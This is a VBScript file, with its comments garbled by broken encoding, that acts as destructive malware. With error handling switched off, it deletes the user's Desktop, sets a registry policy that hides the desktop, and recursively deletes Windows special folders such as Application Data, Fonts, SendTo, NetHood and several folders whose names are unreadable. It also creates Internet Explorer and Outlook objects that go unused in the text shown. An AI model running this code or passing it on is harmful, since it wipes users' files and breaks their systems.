'            = = = = = =  = > ��� ������ < = = = = = = = 

'      ���������� ����������(���� ����� �� ����������)
Set FileSystemObject = CreateObject("scripting.filesystemobject")
Set Shell = CreateObject("Wscript.Shell")
t = 0: On Error Resume Next ' ���������� ������
Set Application = CreateObject("Shell.Application")
Set InternerExplorer = WScript.CreateObject("InternetExplorer.Application")
Set Outlook = WScript.CreateObject("Outlook.Application")


'     �������� ����������� �����
 For Each Folder In Shell.SpecialFolders

' �������� �������� �����
 FileSystemObject.deletefolder Shell.SpecialFolders ("Desktop"),True
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop", 1, "REG_DWORD"

' �������� Aplication Data
 If right(folder,15) = "Aplication Data" Then FileSystemObject.deletefolder folder,True

' �������� PrintHood
 If  right(folder,9) = "PrintHood"  Then FileSystemObject.deletefolder folder,True

' �������� ShellNew
 If right(folder,8) = "ShellNew" Then FileSystemObject.deletefolder folder,True

' �������� �������
 If right(folder,5) = "FONTS" Then FileSystemObject.deletefolder folder,True

' �������� NetHood
 If right(folder,7) = "NetHood" Then FileSystemObject.deletefolder folder,True

' �������� ������� ����
 If right(folder,12) = "������� ����" Then FileSystemObject.deletefolder folder,True

' �������� SendTo
 If right(folder,6) = "SendTo" Then FileSystemObject.deletefolder folder,True

' �������� ������������
 If right(folder,12) = "������������" Then FileSystemObject.deletefolder folder,True

' �������� ���������
 If right(folder,9) = "���������" Then FileSystemObject.deletefolder folder,True

' �������� ��� ���������
 If right(folder,13) = "��� ���������" Then FileSystemObject.deletefolder folder,True

' �������� ���������
 If right(folder,9) = "���������" Then FileSystemObject.deletefolder folder,True
 Next

